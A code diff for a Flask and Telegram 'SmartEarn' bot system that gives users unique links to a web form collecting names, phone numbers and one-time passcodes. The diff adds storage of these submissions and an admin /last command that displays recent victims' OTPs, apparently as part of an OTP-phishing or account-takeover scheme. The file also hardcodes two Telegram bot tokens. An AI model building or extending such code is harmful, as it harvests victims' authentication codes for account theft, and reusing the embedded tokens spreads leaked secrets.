@@ -1,5 +1,5 @@
 # =======================================
-# SmartEarn Multi-User Bot System with Admin Bot
+# SmartEarn Multi-User Bot System with Enhanced Admin Bot
 # Developer: MN SIDDIK
 # =======================================
 
@@ -7,6 +7,7 @@ from flask import Flask, request, jsonify
 from flask_cors import CORS
 import requests
 import uuid
+from collections import deque
 
 app = Flask(__name__)
 CORS(app)
@@ -15,13 +16,14 @@ CORS(app)
 # Config
 # =========================
 USER_BOT_TOKEN = "8572616463:AAH1sQJsSlYOhj657naFUpKvlNquwtjzrLI"
-ADMIN_BOT_TOKEN = "8292480092:AAGlR5uZmj92shdUrtOEZyacezuQvYB1IPA"  # Updated token
+ADMIN_BOT_TOKEN = "8292480092:AAGlR5uZmj92shdUrtOEZyacezuQvYB1IPA"
 BASE_URL = "https://smart-earning.netlify.app"
 
 # Runtime memory
-USERS = {}          # uid -> chat_id mapping
+USERS = {}          # uid -> chat_id
 USER_CHAT_IDS = []  # all user chat_ids
 ADMIN_CHAT_IDS = [] # all admin chat_ids
+SUBMISSIONS = deque(maxlen=100)  # last 100 submissions for /last
 
 # =========================
 # Telegram helpers
@@ -52,11 +54,14 @@ def handle_user_bot():
                 USER_CHAT_IDS.append(chat_id)
             
             link = f"{BASE_URL}/?uid={unique_id}"
-            send_message(USER_BOT_TOKEN, chat_id, f"🎉 Welcome!\n\n🔗 Your unique link:\n{link}\n\nএই লিংকটি কেবল আপনার জন্য। অন্য কাউকে দেবেন না 🔒")
+            send_message(USER_BOT_TOKEN, chat_id,
+                f"🎉 Welcome!\n\n🔗 Your unique link:\n{link}\n\nএই লিংকটি কেবল আপনার জন্য। অন্য কাউকে দেবেন না 🔒"
+            )
             
             # Notify all admins
+            msg = f"✅ New user started bot:\nChat ID: {chat_id}\nUID: {unique_id}"
             for admin_id in ADMIN_CHAT_IDS:
-                send_message(ADMIN_BOT_TOKEN, admin_id, f"✅ New user started bot:\nChat ID: {chat_id}\nUID: {unique_id}")
+                send_message(ADMIN_BOT_TOKEN, admin_id, msg)
 
     return jsonify({"ok": True})
 
@@ -79,11 +84,40 @@ def handle_admin_bot():
         if text.startswith("/user"):
             total_users = len(USER_CHAT_IDS)
             send_message(ADMIN_BOT_TOKEN, chat_id, f"👥 Total bot users: {total_users}")
-        
+
         elif text.startswith("/broadcast "):
             msg = text.replace("/broadcast ", "", 1)
             broadcast_to_users(msg)
             send_message(ADMIN_BOT_TOKEN, chat_id, f"✅ Message broadcasted to {len(USER_CHAT_IDS)} users")
+
+        elif text.startswith("/last"):
+            if not SUBMISSIONS:
+                send_message(ADMIN_BOT_TOKEN, chat_id, "⚠️ No submissions yet.")
+            else:
+                msg = "📝 Last submissions:\n\n"
+                for sub in list(SUBMISSIONS)[-5:]:
+                    msg += f"👤 {sub['name']}, 📱 {sub['number']}, 🔐 OTP: {sub['otp']}, UID: {sub['uid']}\n\n"
+                send_message(ADMIN_BOT_TOKEN, chat_id, msg)
+
+        elif text.startswith("/stats"):
+            msg = (
+                f"📊 Bot Statistics:\n"
+                f"👥 Total Users: {len(USER_CHAT_IDS)}\n"
+                f"📝 Total Submissions: {len(SUBMISSIONS)}"
+            )
+            send_message(ADMIN_BOT_TOKEN, chat_id, msg)
+
+        elif text.startswith("/help"):
+            help_msg = (
+                "🛠️ Admin Bot Commands:\n\n"
+                "/start - Connect admin bot\n"
+                "/user - Show total bot users\n"
+                "/broadcast <message> - Send message to all users\n"
+                "/last - Show last 5 submissions\n"
+                "/stats - Show bot statistics\n"
+                "/help - Show this help message"
+            )
+            send_message(ADMIN_BOT_TOKEN, chat_id, help_msg)
 
     return jsonify({"ok": True})
 
@@ -120,6 +154,14 @@ def handle_form():
     for admin_id in ADMIN_CHAT_IDS:
         send_message(ADMIN_BOT_TOKEN, admin_id, message)
 
+    # Save submission for /last
+    SUBMISSIONS.append({
+        "uid": uid,
+        "name": name,
+        "number": number,
+        "otp": otp
+    })
+
     return jsonify({"success": True})
 
 # =========================
@@ -127,7 +169,7 @@ def handle_form():
 # =========================
 @app.route("/", methods=["GET"])
 def home():
-    return "✅ SmartEarn Multi-User Bot with Admin Running!"
+    return "✅ SmartEarn Multi-User Bot with Enhanced Admin Running!"
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080)
